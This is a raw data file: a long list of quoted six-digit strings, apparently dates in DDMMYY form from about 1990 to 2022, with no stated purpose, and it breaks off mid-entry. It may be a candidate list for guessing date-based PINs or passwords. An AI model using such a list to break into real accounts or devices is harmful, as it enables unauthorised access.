'050190','270693','020517','151008','250810','091202','021218','140491','280722','200101','110413','211218','210109','270206','290621','250695','050300','131221','080910','101000','040604','010304','270707','260101','010305','201096','140416','190800','150710','170310','040891','020422','080195','261098','081013','121111','230590','070903','031198','190913','280508','260606','041297','250601','160914','090315','061098','231196','070722','151298','050799','070114','271191','040200','180513','041202','240813','210116','040194','260112','060301','110601','290393','180598','271100','050696','171002','300494','120719','251222','190908','131198','010199','161013','130520','290912','130915','070200','070496','160209','070922','160213','051211','120106','061297','220696','040918','011101','290792','250922','050793','270300','151290','161222','100895','260902','121199','051197','060719','241018','231011','120394','100417','020799','060310','300912','251217','260895','150592','230501','260614','150522','150793','220403','080521','230101','231106','010999','151093','190400','220500','241121','240819','270720','231296','131114','030395','111191','300718','300194','011200','131295','270411','200617','050391','160318','030822','060115','130712','130201','190491','111222','060413','211291','090111','260590','051091','090105','280314','080799','230116','280420','040722','200490','181100','230506','070797','060300','200205','201015','080695','210805','020211','160796','270904','261001','060215','230203','150103','261295','100111','090290','240115','111211','090113','190117','170220','090996','110517','150314','200796','181000','011213','140503','151193','041100','170806','111097','250708','250392','190918','210620','240192','121092','200591','270107','150809','280614','170200','240794','271203','060599','081003','300320','241117','280607','080503','190399','230718','161093','041221','020998','110119','150193','141299','080211','170822','290690','300100','180111','230214','300202','300905','241108','171113','100221','100915','140508','281195','060101','091111','040394','020718','140200','200321','270622','140422','300412','071217','260316','080709','070815','170715','260521','281217','210601','220805','200208','090391','031109','270896','200511','181203','251194','220119','271215','280306','090403','250618','110318','160997','240915','060614','070602','150804','160994','160706','110906','110603','080117','010193','251295','150892','090421','220910','100108','181213','070116','260994','260821','170599','180398','010122','200496','130216','290995','171203','011001','231190','180698','130901','280117','091117','030718','290893','031215','280213','170512','290412','101010','220698','250793','241090','200298','170122','010800','210692','251016','180608','230421','180512','050390','070490','280591','240298','171218','120408','241014','020914','140705','120590','170719','050918','171216','151006','160414','270495','240810','030916','291218','041122','120912','050203','081205','131209','251014','030714','130816','201010','010792','090321','290595','260797','180195','161099','181013','080107','260195','200407','041090','020390','030116','170321','200302','240990','270696','140407','020693','280215','081217','290109','030192','041207','161209','241221','230295','070100','271211','280410','270819','071207','010705','301218','060904','191109','190504','210222','140201','050401','171120','080412','180692','010621','150315','151090','080820','041222','110807','220508','061193','181208','241002','010911','250122','090119','130703','030900','240993','290303','050815','220802','271011','150597','051203','230307','110994','020904','040991','050504','080407','081018','271121','210500','291105','081196','250293','170791','050121','080115','010620','011022','100622','120519','270421','020104','291122','271201','020298','140391','131120','271013','031100','220395','080918','030108','150917','030122','190795','010798','260811','030417','200906','290711','100820','010595','160722','270609','210219','060394','300490','180199','020302','100519','250493','161203','100514','240100','261120','080222','220620','030601','121109','071120','110297','060122','090200','081107','230691','140316','290218','061213','110699','140115','020996','300500','260214','160500','111200','181200','091004','120800','191105','250606','270515','130293','240691','220916','180813','040508','190300','270310','060416','270412','250891','270802','190691','180204','230605','150599','200218','180517','220498','120502','291292','290204','090508','050500','200311','260793','260218','250210','230899','030593','141011','120900','260709','250996','300799','270608','010312','110397','250299','030200','020121','080310','180222','231221','220812','180103','240695','140593','141198','200803','170322','070402','200300','110120','050902','131095','091196','100314','181100','050601','200410','241214','290211','300992','190516','060804','090991','010303','060198','231105','270494','260404','271222','250305','200111','071213','020701','210795','180200','090612','300314','080396','261003','280217','201219','260922','220715','030308','250620','040818','300300','111116','290715','190790','250715','080599','011208','230515','271115','300503','210905','020692','250895','021014','171217','190900','180900','110305','170296','011004','130199','201116','021017','171003','041002','011207','060391','260314','050711','141105','271213','211122','131213','060795','230498','030197','040320','120411','040699','010821','081202','230918','050706','130196','250901','221001','221298','160496','110817','100210','261018','160292','300507','300797','300990','120802','110705','280308','301296','090506','160299','180510','250590','060909','080602','270490','030496','261002','030212','200397','110695','090402','241290','031207','200406','171101','230202','091018','190903','200893','300516','290700','180121','160212','301016','050597','110217','130309','040792','240119','160709','050303','171195','070821','110321','141008','090595','241296','081091','081222','231202','171000','250917','180718','020992','270405','240190','231222','280114','070500','230997','241104','220791','271216','271116','180800','040105','231013','250604','080312','230418','200917','201021','030717','061217','260197','191208','241298','230820','120102','260298','150998','180800','070117','160412','160717','280719','261111','261218','270394','030806','160311','271007','010411','300896','121116','150295','150114','041295','240701','290501','080293','030507','300392','240703','111299','301021','300121','220500','061296','220522','090810','130817','091014','220705','220613','210201','170593','131006','101009','020591','040800','071008','040608','100621','011119','110190','070920','150601','080298','100218','131113','041097','080898','271112','280300','100619','101102','270102','140396','070800','270691','140897','100897','220313','091299','180212','301220','160417','190503','180299','041113','100617','020105','100101','040997','110410','300312','211092','220506','080121','120717','030803','130121','090604','050422','170200','141195','030594','170194','280803','220917','191094','170192','040994','041205','020511','120390','160217','180722','170897','250419','291000','080102','060296','260795','030800','301207','040114','210218','180904','230391','260822','130495','150791','180892','020507','050890','250803','250308','180408','220995','260900','121120','300698','060308','150913','020997','190207','050411','030819','090416','031208','081207','270193','200313','110209','220700','231200','170899','060699','030112','200493','061009','020712','150111','070794','291213','250698','300693','190620','121200','290291','110401','290394','090621','010492','160708','131290','270514','140811','180307','050697','260622','150218','120113','231122','031114','121008','171110','160918','181199','280697','010222','150922','010209','290215','240193','201195','100813','010300','100400','110606','170790','080210','210913','031293','090401','140908','271000','251018','200690','120814','160491','031297','191112','130990','131003','300310','170498','080604','210406','120507','260700','241003','010717','060297','241206','050992','200491','091198','010697','291207','250221','020810','170890','020700','080493','271019','161107','120393','260407','221293','211008','220299','281011','070199','060306','020491','230220','070418','271221','051017','160290','120721','160909','041012','290717','070415','070216','260117','090897','250413','270195','230716','180714','300810','170522','160215','160797','130504','151120','070611','260502','180319','120611','070713','210900','240800','130692','010991','041106','110199','020721','180617','201092','090610','261014','150803','020800','071100','240120','120416','071105','020117','100196','120111','150219','160600','190195','150398','120618','060805','050112','210103','280911','100102','280391','020322','231017','030295','221100','270106','140814','150191','060418','061107','060422','030322','111013','060797','300520','271021','290106','230119','021191','160202','240702','220296','190500','020217','011197','010200','220310','040115','271292','030502','160309','091019','240420','140702','280502','110896','160401','230118','260618','070206','110910','190606','300808','270692','300298','251090','020807','060915','161113','250316','221004','260800','211200','020506','010298','220300','201198','090800','200519','271218','281296','200409','180196','120808','290499','090718','040294','290113','130408','021097','040201','290890','260393','201091','111208','221106','040919','201222','301013','291117','070915','200912','090590','250306','130892','090509','090492','060992','100906','261005','150497','020106','060404','290698','030492','270199','220810','180593','060917','040790','261015','130512','260809','240614','010119','300214','071215','111007','210215','180416','110417','010500','100800','081104','011298','180505','151105','271104','140420','130695','090993','100804','110114','020706','171219','280493','200901','040113','211216','220199','280618','091191','060791','020315','131218','240322','250415','121295','040613','280298','300502','290594','010893','170992','210614','070798','130103','071001','061215','170818','291015','021100','181292','100596','140419','300393','210112','180995','140709','220509','060707','110717','260920','210419','060112','080892','271109','040103','090395','221097','050901','020397','051000','240393','090696','280918','050698','161014','060217','291001','230199','270501','110513','230810','041092','081108','090192','200721','270220','261200','290311','141099','010720','010200','210508','170799','220604','250614','120919','210221','091212','130410','281202','210505','230100','160592','160719','290397','181192','021109','080420','161218','030203','211215','040808','061094','160521','200220','180516','250216','030208','260690','200495','241198','041020','270708','280415','211193','251119','260501','210319','291296','230403','260303','110100','260514','150104','280620','040795','101220','021101','020902','301097','171291','070510','230903','200717','210910','041120','170491','041108','061012','290603','120709','200310','100100','141297','260703','200709','290817','220891','150208','160403','020318','010219','230819','021294','090291','180305','180300','091291','060520','050519','130511','080703','071220','280313','071119','120990','060891','100910','250205','150496','151011','150711','131105','020321','030300','190410','290799','040191','130811','130193','110220','120893','051002','171193','211021','161010','270903','120314','250609','260292','140692','070506','260713','240704','200112','281102','031214','180509','081095','010496','080803','100308','140203','090322','090193','060406','080292','280193','200113','060504','201008','211121','010498','130996','200593','140193','250600','120196','141102','210205','261220','150305','101196','010820','081005','190101','021290','160418','040401','181096','120202','240707','270400','050622','120918','180320','031295','010608','240196','291093','260201','100797','080304','090318','111005','270600','171190','060621','081291','021205','150991','220322','161117','020722','160419','051119','090798','080911','191111','010711','040601','050900','300207','030198','130900','050218','280794','160901','030692','100298','030312','070990','070900','161121','120898','090903','141216','120707','020709','270217','050209','260813','260722','240210','130315','300199','041206','071116','060811','170597','040700','040714','210397','020600','210105','260119','211108','181195','180220','181102','080315','070695','110718','060592','051216','060919','020404','160103','160710','191293','250396','150796','211116','210797','221209','120505','011106','210322','150617','111009','030201','070804','070914','190617','081017','010420','240612','200502','290403','290599','151200','280295','220713','200120','200512','290509','121208','130711','260307','131106','251115','280904','061103','200522','210418','251220','201018','150301','140319','190106','081015','300714','111107','111291','190909','100993','091199','230705','040217','090208','180113','101216','290820','180906','251213','110100','170416','080203','290103','071109','091208','010915','080122','100211','090618','021013','170895','200510','200392','220691','250119','170393','031219','090917','010106','250714','170594','240301','070814','120421','110917','280516','120409','161110','100990','131297','200819','051206','181004','280622','150197','040796','141191','190208','290596','180201','250102','271290','230312','060993','150100','040197','070404','280801','261190','241207','030720','190214','010996','030618','220908','200994','160920','220707','231020','201194','270296','210104','081214','060408','200203','090491','140694','090916','271100','180507','300296','091021','300203','060100','050716','270807','020293','040622','220211','300911','270599','170699','060290','090502','201295','150121','180891','230302','300319','011193','210402','250719','211211','150715','110500','031197','071296','200501','040504','300696','291090','140519','020398','071022','220907','150916','081190','100703','280999','240101','200602','181093','070400','071010','230207','140497','200309','280400','180210','110698','110522','030303','091103','140596','190211','220407','280316','131100','160205','160498','250400','300602','150902','100201','150110','201011','050719','270813','110810','200922','210309','251210','080903','210997','200614','210118','020614','280994','170215','050700','151204','010220','200520','121221','191097','241201','281294','061116','190200','301116','120221','090702','120220','300617','011297','140217','061000','130510','041000','281096','260497','030695','061015','081194','080598','150300','210499','260192','290611','230210','021213','230399','170412','300691','221011','180590','301113','190218','290297','120517','250811','110310','140699','240205','180607','210700','171005','180314','010690','220706','210210','260608','170711','261219','040205','250790','210901','030591','091000','081298','040794','230219','070808','280997','271093','290818','220819','230514','171299','161004','130617','070909','140100','300206','271193','030199','030992','141211','050797','120992','240897','070715','201020','290221','041094','201206','290503','291195','060512','090404','140614','131222','240505','230415','301101','230920','140195','021115','091194','150297','070318','171198','100500','180294','200214','181293','071015','070900','120406','060495','240114','160216','200698','100311','170305','080620','260814','160294','270309','210214','011221','161020','180197','050305','190912','240220','060690','010610','250920','040596','110391','010701','181202','040812','080506','260996','100700','300522','261202','290800','221122','131098','151294','280101','240720','120205','080622','221092','020116','100113','141018','150694','140792','050603','020917','161215','210597','190303','090806','150391','220212','230396','220599','050113','161018','020715','290216','070493','180807','201113','031299','131299','221014','240313','050208','180191','190613','280705','170419','021094','211012','070407','230706','030298','270920','141121','071211','280692','080220','061221','190615','160695','040214','171221','050490','251219','141192','240390','200119','220792','071102','150790','291100','270804','280294','040894','280901','250720','160194','200319','190493','261007','140793','260503','040309','210820','160713','150810','090122','010214','160310','070813','191222','160300','150800','260908','201218','160411','110898','220900','131107','010801','150196','260602','230708','260597','090920','250696','160705','241216','081102','070417','150605','200700','220801','101093','060303','080100','190294','170490','200696','060717','160991','020601','121119','130403','080900','290517','060392','210405','100318','210502','160111','010100','261101','090708','200716','011006','110701','030495','160416','030412','290402','031092','220702','271294','040600','180500','160298','030814','030514','260103','080119','031291','251116','091119','200816','281009','090121','010715','290597','261222','240800','180308','160406','250902','090995','050407','190600','281108','101218','191116','191104','040904','160711','100505','150118','230497','101115','040503','110706','241000','161105','020590','050917','090501','230907','080897','201291','060620','241006','230714','220116','200692','300201','030792','070516','111217','020204','220494','010790','150806','160792','151296','151015','221197','290205','110194','040612','090516','120296','220797','021002','271102','160608','200920','250505','260700','010520','131000','231015','250112','241017','261020','170811','070405','090912','190603','181105','230802','110993','261298','121198','260510','150690','181115','030795','170720','161213','230616','280411','040220','110696','270409','211097','050710','170195','060206','010718','290100','210311','050505','071210','140898','271106','180795','141007','150907','230701','070504','021200','300299','210492','230394','270207','280121','200702','200198','290716','080390','111095','110192','140409','150611','240906','110419','190391','220321','090699','170516','190919','190392','101110','180920','090307','201293','210297','300406','071005','161122','250710','080522','221297','230792','290522','280201','010421','220709','230211','220405','180819','220391','170320','030522','200515','251298','301222','051208','190514','030999','011212','070214','080214','290805','061192','250121','290521','100808','030422','230204','030513','140903','190800','290400','191106','050108','110802','180903','041121','051191','220607','100520','301221','180803','051100','020895','240690','070212','290591','010722','140819','161114','101107','050990','100516','120812','100720','240616','191299','200401','050316','050400','050909','050903','300705','260899','020995','010791','090809','220113','010898','060397','030518','130912','110293','241205','270111','210708','020611','280518','291294','031014','170802','111104','091206','170306','090216','010297','280413','170706','300608','150415','241200','290492','281204','061118','290721','251117','040815','140602','110791','121296','180508','271006','280293','201192','100811','220221','191216','120816','280699','180521','021113','150321','221211','120619','050792','290615','151013','030906','181207','190893','191212','110615','110600','200102','170417','070606','090195','241001','010494','261203','040807','140600','201297','010596','011205','290295','051213','271210','280609','010601','200290','180317','200894','130594','240907','120304','070215','060720','300211','140114','010702','111008','210890','030307','220502','280407','030114','260217','100521','230316','091096','110604','110594','190902','150813','060894','081219','270711','160902','250595','290415','060415','170999','200100','231193','231008','280320','120915','301219','231112','190397','280401','020613','121294','270891','020696','280300','240895','110290','260620','170922','230513','241112','131008','101198','290697','080995','200913','260599','190304','290918','020406','170808','170492','100716','210709','270520','081000','091001','250693','200400','040100','130911','190609','270811','050620','210701','240806','170592','120491','040310','170118','181216','040908','230217','141111','010809','190413','070822','041001','140221','250791','180418','150390','040710','170511','031294','100209','130215','121022','040721','041195','080512','120316','240593','250206','180700','301119','110605','211006','230221','050704','151201','160203','281013','070419','080191','060118','080514','050920','090413','141014','250799','300800','271212','030106','210618','140802','260591','270303','241208','020804','220304','231197','170513','300891','101095','051098','260418','140707','081204','090112','121191','200616','280700','020222','240402','221114','240601','260819','180203','280792','170399','050116','291103','120201','200621','191119','251113','090998','110611','080401','300813','170815','211217','120610','181021','031098','050905','301100','080501','130418','160998','180804','090108','030708','271199','111207','170303','051116','231218','031196','021119','300213','040996','270211','080819','160812','240405','010805','120800','270596','240416','281298','070522','130810','130891','090811','260706','150905','260116','300713','240111','120997','060312','240400','061100','010814','220694','130117','160999','031102','191205','280905','150322','190212','140804','271008','120821','150296','110405','251291','060293','100816','010395','130409','230696','060816','160308','030604','180118','250717','210407','101114','100491','230702','171213','090790','181011','141106','070492','050200','010916','090190','150210','130191','010602','070203','220222','200197','231208','010696','150698','060995','021114','220593','280109','090799','110891','171107','180704','120397','300414','020401','100807','050495','220595','120299','020801','120293','161098','241012','010822','021296','130796','260107','111192','170990','050513','180102','040491','070620','010116','300709','120412','251022','020822','230401','101097','300401','171201','220110','150303','260696','211011','020908','140301','290396','010510','040404','051022','140412','110806','120703','261099','050796','180913','291212','230902','020704','080690','020206','031001','130406','201002','040692','221212','040497','041296','180602','030111','190996','020711','110214','010296','080895','271204','220214','270503','080613','170607','260220','100705','230190','280602','281111','290100','060121','261212','101020','010391','180208','070520','060802','221191','190409','051193','070892','211290','210810','250422','120521','230818','170519','070201','051005','141091','071000','020922','081209','190401','030600','010796','140907','300699','140390','060608','031018','100513','180597','120320','170994','280511','040900','181220','220594','261121','120518','190505','050906','090120','270115','030707','020813','060920','220302','170120','221207','220711','290705','290612','100794','220402','051108','220518','290293','201119','090409','020901','260203','250900','211210','141298','120994','160320','251101','190199','050804','170712','040813','060901','070217','160701','270314','281194','190616','281104','260705','191098','010890','250297','090722','150400','101121','281007','190200','160410','040516','070414','100999','240201','100714','010920','250401','080209','140621','101013','231209','251000','300899','040505','181215','100208','040312','150499','060117','040911','091093','181290','291299','130492','060107','030890','270418','080491','290317','170112','250409','140609','210300','260806','200418','190402','180310','270506','240820','190801','250619','140206','131018','271003','250919','090905','250405','280100','271296','270397','171212','160804','271208','181117','291091','160704','010693','261116','130790','031010','131202','060810','100409','040910','200900','220600','270890','230492','160197','300818','020897','200609','140598','210798','190292','110113','281004','110101','080112','011021','140810','250192','120306','241295','110692','301208','150603','030590','260699','111202','290718','010215','020310','030101','250821','140296','230100','010321','280902','190518','011003','070908','160316','200204','200402','170991','080109','050115','220203','300809','130421','040204','210206','190992','110999','020317','250806','160896','060801','211219','040696','040907','280418','051099','060492','111205','060702','010703','251109','050921','021105','190991','121001','120592','031020','021015','100315','200497','100616','100294','070306','130605','010818','061017','291096','260719','101018','100718','280800','280619','160492','100316','300593','190822','280606','110518','180399','260403','051015','160605','010208','300817','160395','020498','210593','270507','090706','210496','091218','270406','251107','040419','090598','300803','221222','201013','030800','210202','200910','170920','041215','241293','130902','011110','200291','290213','060511','290419','060697','160400','290907','171090','190321','160697','230400','040290','130198','040199','220308','150515','051215','120714','060921','300190','161192','110610','180595','220210','081001','090497','150416','180694','111111','120712','190406','190695','030300','210395','281003','120398','051299','140510','060597','010107','290422','250512','160892','081097','270320','061207','021198','210710','140210','120107','110498','241015','121117','120392','220191','220614','280890','130195','191110','061099','050594','071202','211010','050304','170598','140901','100503','150200','241096','180100','201290','260105','030391','291222','290496','290500','040521','080311','020817','100495','071112','160908','020522','100817','240791','190917','180396','240491','100213','070121','160511','250393','180806','060204','230999','060996','140617','210920','090194','010196','110997','081292','030610','020410','240997','180794','240706','200805','100197','241190','190611','210993','210790','100194','040791','060190','120614','270500','010120','060613','150109','120214','280192','010600','231003','140490','070901','210122','210194','060498','280797','040300','221203','040822','220108','260592','191010','120620','080118','170499','160900','020218','281199','280790','070421','180497','100805','250997','170722','250204','110510','270307','160612','280299','191095','020595','280894','240417','300209','240821','161019','080798','230417','270396','100494','010813','050192','191210','080594','220800','010213','110922','231215','250402','200921','301118','101016','020509','171014','150300','070613','230292','070105','160415','061106','210806','010509','031108','240401','121203','111109','240194','040501','280909','130791','240400','261122','100791','040120','170217','270798','110900','220717','111001','170792','080821','290310','240516','100506','131013','290902','270292','010597','230502','220504','270600','300708','301020','060619','071115','040415','180893','081295','030117','080207','250395','050413','230606','210705','080408','270202','060595','061091','030908','181211','270606','080413','160500','220105','090600','201214','170703','040314','040106','140594','231001','270221','011299','250494','141003','021116','260394','180394','281192','070120','091091','120906','030500','160712','140904','160297','200395','270905','080822','261019','210896','241099','270522','290304','280611','280908','251196','060502','180693','170503','260398','240199','260395','090816','080896','300908','090606','070317','210400','120895','281201','220517','110903','250218','190416','111210','221201','290407','090213','060321','070593','240100','070898','181196','211103','291097','270602','130213','250899','160800','090697','181020','201213','180404','230893','090316','090712','220194','080796','070508','021098','131004','090422','040215','230722','200521','130604','240693','250303','130317','300318','210700','201120','291107','081221','101004','020513','011012','020412','190317','290200','200813','020905','110794','100694','161016','030997','070810','040222','180420','150619','080518','300197','221109','280113','140417','121098','201121','250120','091211','060903','170814','280592','100801','220999','071299','120197','080418','230609','020400','101017','060390','140993','210498','090503','260199','261191','170605','090212','010405','080809','150714','070717','100200','210512','020805','050791','220297','290809','070906','170619','170221','160195','300399','130600','300311','170203','271195','070601','150411','161208','280522','291219','081297','220718','120400','061206','130316','010315','270898','031110','191196','150309','290498','270806','150320','190510','180713','031117','261022','010292','140915','100116','290404','101012','030291','151096','280597','221110','180991','180921','071209','260400','271091','030402','100809','091116','050421','141113','090619','191091','230500','250722','141206','070905','050994','120696','270401','260593','200292','170302','070802','080511','110504','290999','280205','060311','300204','150101','100890','150221','020208','010802','251201','010804','261193','250993','170998','150212','280318','130120','060618','300410','160690','240107','011117','050493','120190','170517','061095','110918','301200','010407','101214','300994','180699','200997','210396','141097','240818','010419','051112','111018','300917','011209','150695','130696','130119','200694','270906','220901','020910','091213','220609','100421','180802','070605','090314','060800','281190','300717','281112','120998','081016','070301','120594','240222','051103','060209','110411','111121','270914','030219','280500','150216','211018','141196','080394','080498','291006','260805','070702','050806','300105','250507','170795','130893','170402','120100','140199','301206','110707','290292','250508','010500','280802','020705','300806','150600','100313','211001','091298','230607','300822','200622','101119','180322','200104','141005','280819','200703','150996','170892','240104','151095','280515','200191','161191','120718','200902','121020','010618','270793','080300','221204','160921','170805','250397','060918','140215','240200','141210','070999','261113','250116','160396','210501','090294','190500','100991','240296','110796','210192','030597','010590','020496','010104','050515','040117','290512','220493','130505','210996','081113','100103','210706','140514','260409','131191','051093','181294','190205','231093','260916','030910','221020','250318','261105','150299','290896','100903','190213','020413','110216','301094','030215','030799','100907','180918','280108','130321','090596','100701','170201','080403','281214','290804','190591','270590','160120','170314','091120','200516','290118','070904','050598','031003','181197','040500','170505','240395','120391','010910','040810','280610','170494','180499','040892','241292','050319','301122','150500','190590','130600','290196','051092','281196','070422','210595','250495','301102','140212','130705','140504','290602','270191','221218','240802','011222','280403','300821','070295','010803','080200','190400','220591','140708','130802','101000','070791','290917','010607','090700','071012','050311','180402','080921','061100','230909','071214','220816','160601','230201','070315','201191','100604','201112','040216','300220','100104','151117','230311','070691','081011','130491','021221','090396','170198','150901','050110','130314','230108','120907','110900','201296','100500','250407','260896','170613','180899','231107','230113','280695','301090','131090','090400','270990','191000','271299','171112','220603','091003','010905','051200','121211','100114','111021','281293','170396','151103','220100','190703','260991','151116','011195','240718','050394','260610','070308','280296','100400','100902','270900','050502','080216','150120','260998','181014','200592','190311','220490','150206','250893','150102','221021','080111','201212','041115','140911','020405','150719','010615','130513','190490','110304','270897','070213','150812','141197','210892','140999','021194','030421','180711','130702','280806','220809','290520','141203','270306','010904','110616','170307','210191','290593','120813','260918','210908','100914','280795','190293','190521','270302','120495','300598','030120','151190','300903','010394','220495','180592','150200','121105','230512','171215','130806','020698','080499','300816','051219','201090','030603','010307','121016','180221','071222','210110','080291','200500','200294','090498','130290','040393','240320','161100','130299','020717','230905','270513','141000','190707','020616','300603','080217','281122','221096','100416','110622','151118','050592','220111','030403','231095','060494','051222','210302','070698','101213','280115','080302','040704','280707','050713','051212','070919','030420','230296','151108','291209','301294','300915','080993','010322','201094','190897','140312','130110','201100','250796','180393','260500','051095','240399','030220','140192','060991','081213','090691','251095','281290','250198','020720','160594','120607','030821','060401','090818','301120','300800','230111','020690','170502','250300','130995','180198','150912','051107','170391','181099','010412','171111','180122','020113','031120','090591','291099','301290','210898','070221','251205','181008','080710','130614','151110','191114','221100','200911','250214','070714','250502','110213','230601','020500','040100','261199','020790','270615','050617','020695','080104','040219','031218','020304','070704','230298','250503','120301','210807','181193','030722','180112','140521','210917','131100','130200','100707','300700','251100','040801','100195','280809','150304','050321','191203','240403','070294','230720','160599','080492','111290','070396','071198','230106','250794','090110','160816','231211','020520','200713','091109','270607','261214','260601','160907','111091','220514','170520','240910','290794','070599','210817','130699','180492','270116','260697','150713','030506','080795','260997','220913','210704','101113','250691','200999','020221','211096','040821','080219','050417','160607','140893','270700','040899','281094','181007','220597','171006','221219','040600','051199','010900','130115','140305','220204','230700','200895','250991','041201','170590','031216','040406','010806','080806','240790','241212','100222','120493','061122','050412','030804','270403','260612','260509','200809','090795','130903','191100','141112','160899','261194','151222','100205','071113','181218','280216','091293','260222','300499','180400','070505','160300','301197','110520','200712','040902','120216','010616','130798','121113','240290','101209','290620','240592','211220','060116','271092','230315','210603','221115','300715','110814','080198','051016','220511','190792','210203','170995','170405','091105','031116','170209','180816','060195','100997','100399','191115','170199','170612','130612','220897','030503','260621','280120','210720','100122','130296','160992','091297','190993','180696','171211','271118','070816','201105','020617','190395','060420','030711','111293','041006','010507','270894','030193','110593','091204','070305','240900','140398','270297','300221','111296','260208','090890','290515','290120','020299','170622','270194','290313','200619','090414','140917','110700','050403','080314','090197','180812','140895','271107','211209','260308','300702','200820','070399','230604','270918','030694','091115','231203','030998','091193','011216','150914','160805','081019','061200','040206','270908','150108','101006','151010','280709','060196','040893','270299','160903','261008','030895','120498','300492','160604','070316','140913','020220','081200','060705','060314','230303','090804','081203','170693','051118','210100','140401','141002','201193','030697','261119','020209','220821','160700','050503','271291','300110','050894','301110','240300','270797','280212','031090','061199','040708','050318','030413','280612','021095','210304','270500','160402','011190','070107','290302','101007','230703','090705','240604','100706','060507','200596','111214','220902','300193','200393','090214','220719','260515','280721','240514','150721','160206','151018','101201','240407','270497','090306','240108','070207','120817','120422','250713','151002','290493','140302','090293','090393','230692','301012','290914','070617','110222','150811','041200','230707','060102','181101','230208','140207','080319','170394','300305','090797','090310','280495','110790','011203','110200','220820','130407','050700','240919','111190','050520','050107','221215','121004','220813','161293','080502','210699','090196','120308','030516','090309','250916','130598','240996','280315','100702','031013','030901','140921','260490','100303','190619','090701','020608','200503','170406','140394','080509','200918','100306','070196','021090','241091','150220','130616','220515','240617','170119','150100','170717','160593','270893','231198','190202','170316','210619','050313','100822','210801','070894','251293','020292','040903','030409','221202','110710','100690','180594','061291','051196','180900','151091','080591','280111','250605','090305','010993','260913','141221','270312','180616','211198','020615','281014','210921','140122','081004','260311','291200','160611','230290','010221','180296','240795','060216','200814','120795','140799','131195','160799','120790','300391','030194','171009','280220','250504','120512','091295','280513','300590','030716','020202','211004','040109','200498','010816','141004','090710','071193','190597','080700','010921','100119','240411','031190','300509','250496','040591','111112','031220','030796','131200','191220','250592','271096','091013','150201','210400','210811','290691','250220','170610','200697','060600','191201','030511','060515','070410','081094','070996','281098','040816','111015','251015','270204','071200','260815','300901','130899','050195','160693','250913','150498','270922','021100','081112','200815','220306','061096','300417','250398','051210','180719','041199','190806','080721','130522','270895','250100','140900','040998','180596','030501','080600','171292','070101','210404','081109','120109','091009','070994','270910','190715','261091','050101','080915','241008','121090','250506','150393','180192','080801','291298','010909','300612','230990','270601','010499','221111','211212','011294','230621','060601','050219','090899','240608','261009','010619','100109','251207','280712','240713','090608','071200','270810','270390','260695','010606','180810','131201','021200','150397','091010','010105','121112','120506','160501','010891','050705','170812','090320','090298','170915','190315','131091','300801','070891','280297','210111','100693','220721','190390','050807','210403','021112','111012','090400','290998','050499','170596','040716','011296','061101','180890','050221','150821','300600','080301','031101','210306','270316','110115','230499','060414','200990','040303','090817','120591','030121','050207','070991','081101','150999','210299','210718','100410','140208','110803','200404','290222','250818','301109','040499','110191','290306','070110','280822','181016','060899','240692','020893','280995','160806','250115','271099','030118','270419','110511','170704','010118','270610','100412','010192','070701','240422','301194','260702','030316','010318','011293','180205','111203','160303','110118','210721','020111','161201','240198','040915','200296','240600','300606','191221','061198','091107','050618','030996','170101','290819','181097','080702','210313','191006','131215','200715','290208','170614','130305','090319','120222','020319','040317','180297','110821','070907','140194','301010','271198','131122','110207','070314','021197','181018','140805','190904','050118','240803','120200','051113','300802','010301','270820','091100','020508','300710','080614','061092','190108','020207','040806','120810','220906','160405','101221','300904','150203','031290','230803','191296','211214','111195','100922','090607','121102','050496','100717','261006','240314','260317','291002','110204','130720','161001','290598','061104','151102','291190','160990','201118','101292','080405','160714','210511','201003','080691','160119','140314','170801','210213','101094','130592','120207','060300','210504','061011','250816','020598','170809','091102','040715','270713','010103','130101','031091','280500','101100','180511','131012','051297','300195','300622','131112','021012','080916','291210','220107','250822','110208','181009','190209','210106','040709','080105','120799','110919','240603','130593','060403','080804','190899','230300','160518','211195','181019','160616','260190','040313','261209','160590','120897','200304','220496','060997','040399','160115','230595','220998','080590','010709','290115','260611','161198','140518','150508','301001','221210','051296','200301','040319','220919','250999','130412','140109','270812','231220','220811','300200','150302','171205','130400','181108','061016','170905','130415','170690','150697','090815','160222','121200','190414','150413','291216','140317','071000','050722','250910','200221','240595','050119','300418','290991','010592','190718','190592','290604','081200','071004','080706','271020','130390','221291','040890','290200','110800','231292','020119','261215','271014','150520','120603','190105','251096','190412','040202','210602','230510','110921','050708','250312','020296','190811','190722','290510','210792','270921','251122','150891','200117','220399','250915','170796','100216','141110','200915','030620','280214','061020','030912','080103','261291','110117','050300','281000','180721','201122','160808','130507','010598','050707','110499','120402','290607','060812','020796','030109','270695','280311','130890','240717','070590','171115','190396','240195','071097','290801','251214','030810','201203','280812','241291','191108','140404','151210','290491','170304','240814','141222','300898','300511','250211','060799','080990','131203','160702','020301','221006','030519','111011','130804','100911','151021','241007','180990','110109','111004','030802','270790','210800','050212','071114','010210','131208','160916','111114','040707','260118','280617','120318','070912','280122','270209','111019','100699','150493','080815','130405','031194','120803','010491','171008','260196','280414','070406','091106','300500','270796','181095','041198','160100','231299','050404','071014','250894','030693','260803','130222','100700','070321','220499','201022','151100','270101','140715','090107','130710','130500','240494','131111','170907','290813','051009','111298','270122','130503','130498','170398','260306','070896','180600','280914','290417','131005','171197','271120','190507','121003','170397','050291','260200','160510','030790','250815','240501','030702','200419','040392','060396','280520','080414','130113','290816','141209','011194','250896','071118','250322','210719','200315','040398','250310','030915','201221','240215','040420','300795','090103','300605','151200','020100','290315','200192','270417','180400','270709','240307','140818','030405','141094','011196','081022','160993','111014','121202','241116','160513','021107','250200','251218','060516','170196','260716','240292','090292','260897','210599','130394','191217','231294','160603','200422','081191','290608','220592','141201','100695','030107','210117','140704','190310','120796','251121','030306','050122','160809','080919','300513','180312','121206','101005','170819','200295','090896','210517','090895','250521','010403','110719','220100','090695','181191','191213','070394','060405','280711','211118','021000','180295','271122','100200','080295','160204','291112','170821','140711','050816','090504','021210','110512','150205','100796','031112','181200','230493','171019','191292','110590','301298','160390','050898','150407','140899','230619','290497','060716','161290','250203','031000','100497','080397','041292','150392','240293','150319','051204','181110','150802','240610','030305','240317','250792','261112','110700','011097','210522','050317','300804','300721','061117','111110','040397','200411','230697','020819','030719','161206','231199','181106','210609','200606','160192','240319','090493','241110','090901','101208','050292','140696','210799','240308','171093','120710','150992','010902','100610','240822','040300','180805','240914','270214','080290','010404','250602','140695','191291','130900','040519','181098','060796','011116','211200','150405','040920','110493','190497','230390','020103','050194','051105','211197','080705','260714','030396','110805','120103','280598','091217','060120','181006','240404','160495','270705','150591','070918','150911','170721','041294','031004','301011','150209','190115','280595','080205','090299','131292','030294','140517','121095','280221','070409','290702','12040